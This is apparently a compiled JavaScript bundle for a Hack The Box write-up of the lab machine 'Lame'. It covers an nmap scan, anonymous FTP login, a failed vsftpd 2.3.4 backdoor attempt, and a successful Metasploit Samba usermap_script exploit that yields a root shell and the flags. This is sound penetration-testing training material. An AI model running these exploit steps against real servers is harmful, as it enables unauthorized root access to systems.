(window.webpackJsonp=window.webpackJsonp||[]).push([[81],{422:function(t,s,e){"use strict";e.r(s);var a=e(13),n=Object(a.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"lame"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#lame"}},[t._v("#")]),t._v(" Lame")]),t._v(" "),s("p",[t._v("IP: "),s("code",[t._v("10.10.10.3")])]),t._v(" "),s("h2",{attrs:{id:"initial-recon"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#initial-recon"}},[t._v("#")]),t._v(" Initial recon")]),t._v(" "),s("h3",{attrs:{id:"first-scan-the-port"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#first-scan-the-port"}},[t._v("#")]),t._v(" First scan the port")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("nmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-A")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-T5")]),t._v(" -p- "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.10")]),t._v(".10.3\n")])])]),s("h3",{attrs:{id:"result-from-scan"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#result-from-scan"}},[t._v("#")]),t._v(" Result from scan")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-15 03:15 EDT\nNmap scan report for 10.10.10.3\nHost is up (0.073s latency).\nNot shown: 65530 filtered ports\nPORT     STATE SERVICE     VERSION\n21/tcp   open  ftp         vsftpd 2.3.4\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to 10.10.14.10\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      vsFTPd 2.3.4 - secure, fast, stable\n|_End of status\n22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)\n| ssh-hostkey: \n|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)\n|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)\n139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_ms-sql-info: ERROR: Script execution failed (use -d to debug)\n|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)\n|_smb-security-mode: ERROR: Script execution failed (use -d to debug)\n|_smb2-time: Protocol negotiation failed (SMB2)\n\nTRACEROUTE (using port 21/tcp)\nHOP RTT      ADDRESS\n1   71.71 ms 10.10.14.1\n2   71.86 ms 10.10.10.3\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 179.29 seconds\n")])])]),s("h3",{attrs:{id:"result-interpretation"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#result-interpretation"}},[t._v("#")]),t._v(" Result interpretation")]),t._v(" "),s("p",[t._v("First, let's look at the FTP anonymous login portion. We "),s("em",[t._v("could")]),t._v(" try to login and see if we can get anything from the files inside the FTP share. But first, let's find any existing exploits for that specific FTP version.")]),t._v(" "),s("ol",{attrs:{start:"0"}},[s("li",[t._v("We can try accessing the FTP share anonymously to see if there's aynthing in there")]),t._v(" "),s("li",[t._v("A quick google search for "),s("code",[t._v("ftp vsftpd 2.3.4 exploit")]),t._v(" yields a rapid7 exploit.")]),t._v(" "),s("li",[t._v("Another attack we can try is on the SAMBA")])]),t._v(" "),s("h2",{attrs:{id:"logging-into-the-ftp-server"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#logging-into-the-ftp-server"}},[t._v("#")]),t._v(" Logging into the FTP server")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[t._v("ftp")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.10")]),t._v(".10.3\nConnected to "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.10")]),t._v(".10.3.\n"),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("220")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("vsFTPd "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("2.3")]),t._v(".4"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nName "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.10")]),t._v(".10.3:omar2535"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(": anonymous\n"),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("331")]),t._v(" Please specify the password.\nPassword:\n"),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("230")]),t._v(" Login successful.\nRemote system "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("type")]),t._v(" is UNIX.\nUsing binary mode to transfer files.\nftp"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("ls")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("200")]),t._v(" PORT "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("command")]),t._v(" successful. Consider using PASV.\n"),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("150")]),t._v(" Here comes the directory listing.\n"),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("226")]),t._v(" Directory send OK.\n")])])]),s("p",[t._v("It gave us nothing. So there's not much to see inside this FTP share. Let's try digging a bit deeper though.")]),t._v(" "),s("h2",{attrs:{id:"using-the-vsftpd-234-backdoor"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#using-the-vsftpd-234-backdoor"}},[t._v("#")]),t._v(" Using the VSFTPD_234 backdoor")]),t._v(" "),s("h3",{attrs:{id:"metasploit-exploit-run"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#metasploit-exploit-run"}},[t._v("#")]),t._v(" Metasploit exploit run")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("msf "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" use exploit/unix/ftp/vsftpd_234_backdoor\nmsf exploit"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("vsftpd_234_backdoor"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" show targets\nmsf exploit"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("vsftpd_234_backdoor"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" TARGET "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v("\nmsf exploit"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("vsftpd_234_backdoor"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" show options\nmsf exploit"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("vsftpd_234_backdoor"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" run\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# [*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# [*] 10.10.10.3:21 - USER: 331 Please specify the password.")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# [*] Exploit completed, but no session was created.")]),t._v("\n")])])]),s("p",[t._v("Annnnnd a dead end. It won't give us back a session. A quick google search shows that some people suggest using netcat to create a hook for the session, but I have a feeling that the solution is easier than that, so let's the next method, SAMBA.")]),t._v(" "),s("h2",{attrs:{id:"using-samba-usermap-script"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#using-samba-usermap-script"}},[t._v("#")]),t._v(" Using Samba usermap script")]),t._v(" "),s("h3",{attrs:{id:"metasplot-exploit-run"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#metasplot-exploit-run"}},[t._v("#")]),t._v(" Metasplot exploit run")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("msf "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" use exploit/multi/samba/usermap_script\nmsf exploit"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("usermap_script"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" show targets\nmsf exploit"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("usermap_script"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" TARGET "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v("\nmsf exploit"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("usermap_script"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" show options\nmsf exploit"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("usermap_script"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" run\n")])])]),s("p",[t._v("And now we have a shell!")]),t._v(" "),s("h3",{attrs:{id:"digging-around"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#digging-around"}},[t._v("#")]),t._v(" Digging around")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[t._v("whoami")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# root")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("pwd")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# /")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("cd")]),t._v(" ~\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("cat")]),t._v(" root.txt "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# for flag for root")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("cd")]),t._v(" /home/makis\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("cat")]),t._v(" user.txt "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# for flag for user")]),t._v("\n")])])]),s("h2",{attrs:{id:"takeaways"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#takeaways"}},[t._v("#")]),t._v(" Takeaways")]),t._v(" "),s("ol",[s("li",[t._v("Don't dig too deep into the rabbit hole, try other easier methods before coming back")]),t._v(" "),s("li",[t._v("Note all possible vulnerabilities to attack so that if one method fails, other methods can be used as backup")])])])}),[],!1,null,null,null);s.default=n.exports}}]);